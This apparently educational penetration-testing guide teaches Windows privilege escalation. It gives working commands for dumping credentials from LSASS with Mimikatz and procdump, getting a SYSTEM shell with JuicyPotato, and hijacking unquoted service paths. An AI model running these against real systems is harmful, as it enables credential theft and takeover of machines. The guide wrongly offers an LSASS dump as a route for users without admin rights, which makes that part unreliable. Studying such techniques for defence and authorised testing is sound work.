# Windows Privilege Escalation

Learn the fundamentals of Windows privilege escalation techniques with step-by-step guidance, useful commands, and tools. During penetration testing, you often start with limited access as an **unprivileged user**. This guide will teach you how to escalate privileges to gain administrative control.

***

## Introduction

Unprivileged users on Windows hosts have limited permissions:

- Access only their own files/folders  
- Cannot perform administrative tasks  
- No system-wide control  

Privilege escalation helps bypass these restrictions to achieve administrator or SYSTEM-level access. Start with initial foothold access, then use the techniques below to escalate.

***

## 1. Harvesting Passwords from Usual Spots

Attackers target stored credentials or sensitive data using the following methods and tools.

### A. Extracting Credentials with Mimikatz

**Mimikatz** is the most powerful tool for harvesting passwords, hashes, and Kerberos tickets.

#### How to use:

1. **Download Mimikatz** from a trusted source.
2. Open a Command Prompt with **Administrator privileges** if possible (or try as unprivileged first).
3. Run `mimikatz.exe`.
4. In Mimikatz prompt, run:

```plaintext
privilege::debug
sekurlsa::logonpasswords
```

This command dumps cleartext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.

#### If you do not have admin rights:

- Try loading mimikatz through a process like **procdump** to dump LSASS memory.

```bash
procdump -ma lsass.exe lsass.dmp
mimikatz.exe sekurlsa::minidump lsass.dmp
mimikatz.exe sekurlsa::logonpasswords
```

### B. Harvesting Cached Credentials

Look for cached hashes or credentials in:

- `%SystemRoot%\system32\config\SAM` (requires SYSTEM/Administrator access)  
- Credential Manager Vault via `vaultcmd.exe` or PowerShell commands  

***

## 2. Abusing Service Misconfigurations

Services with elevated privileges often have configuration issues exploitable by unprivileged users.

### A. Unquoted Service Paths

If a service executable path is not enclosed in quotes and contains spaces, Windows might execute a malicious executable placed in one of the path segments.

#### How to check unquoted service paths:

```powershell
Get-WmiObject win32_service | Where-Object { $_.PathName -match " " -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
```

##### Steps to exploit:

1. Identify service's unquoted path, e.g., `C:\Program Files\My Service\service.exe`.
2. Place a malicious executable named `C:\Program.exe` (or first path segment) with payload to elevate privileges.
3. Restart the service to trigger execution of your payload as SYSTEM.

### B. Insecure Service Permissions

Use Sysinternals **accesschk** to check service permissions:

```bash
accesschk.exe -uwcqv "Authenticated Users" \ServiceName
```

If you have `WRITE` or `START` permissions, you can replace the service binary or change parameters.

***

## 3. Abusing Dangerous Privileges

Users with special privileges can escalate access.

### Check your privileges:

```bash
whoami /priv
```

### Key privileges and uses:

| Privilege               | Description                      | How to exploit                       |
|------------------------|---------------------------------|------------------------------------|
| SeImpersonatePrivilege | Impersonate tokens                | Use **Juicy Potato** tool           |
| SeAssignPrimaryTokenPrivilege | Assign primary tokens       | Token manipulation in scripts       |
| SeTakeOwnershipPrivilege | Take ownership of objects       | Modify files or registry keys       |
| SeDebugPrivilege       | Debug any process                 | Use Mimikatz or escalate processes  |

### Example: Exploiting SeImpersonatePrivilege with Juicy Potato

**Juicy Potato** abuses COM interfaces for privilege escalation.

1. Download Juicy Potato.  
2. Run:

```bash
JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -t * -c CLSID
```

Replace `CLSID` with a CLSID of a COM service running as SYSTEM.

This spawns a SYSTEM shell.

***

## 4. Abusing Vulnerable Software

Check for outdated or vulnerable software, privilege issues arise from known exploits.

### Step 1: Enumerate software

```powershell
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
```

Or use **WMIC:**

```bash
wmic product get name,version
```

### Step 2: Research vulnerabilities for listed software versions.

### Step 3: Exploit vulnerabilities or escalate privileges via vulnerable apps (e.g., older Adobe, Java, or custom tools).

***

## Tools of the Trade with Usage Examples

| Tool              | Description                          | Typical Commands / Usage                                     |
|-------------------|------------------------------------|--------------------------------------------------------------|
| **Mimikatz**      | Extracts passwords and hashes      | `privilege::debug` / `sekurlsa::logonpasswords`             |
| **PowerUp.ps1**   | Privilege escalation checks        | Run PowerUp script in PowerShell: `Invoke-AllChecks`         |
| **WinPEAS.exe**   | Automated privilege escalation enumeration | Run: `.\winPEAS.exe` and review output                        |
| **accesschk.exe** | Check permissions and ACLs          | Check service permissions: `accesschk -uwcqv "Auth Users" name`|
| **Juicy Potato**  | Token impersonation for privilege escalation | Run with CLSID to get SYSTEM shell                             |
| **Procdump.exe**  | Dump LSASS memory                  | `procdump -ma lsass.exe lsass.dmp`                           |
| **SharpUp.exe**   | C# privilege escalation enumeration | Run: `SharpUp.exe`                                            |

***

## Step-by-Step Example: Privilege Escalation via Unquoted Service Path

1. Identify services with unquoted paths:

```powershell
Get-WmiObject win32_service | Where-Object { $_.PathName -match " " -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
```

2. Suppose service path is `C:\Program Files\VulnerableApp\app.exe`.

3. Upload your payload as `C:\Program.exe` (the first segment without quotes).

4. Restart service:

```bash
sc stop VulnerableApp
sc start VulnerableApp
```

5. Your payload runs with SYSTEM privileges.

***

## Summary

| Technique                      | Tools & Commands                          | How to Use                                  |
|------------------------------|------------------------------------------|---------------------------------------------|
| Harvesting Passwords          | Mimikatz (`sekurlsa::logonpasswords`)    | Extract cleartext passwords and hashes     |
| Service Misconfigurations     | PowerShell, accesschk, Juicy Potato       | Find unquoted paths, check permissions      |
| Dangerous Privileges          | `whoami /priv`, Juicy Potato               | Exploit impersonation and debug privileges  |
| Vulnerable Software           | PowerShell `Get-WmiObject`, CVE databases | Enumerate and exploit outdated apps         |

Practice these methods carefully on lab machines to become proficient.

***
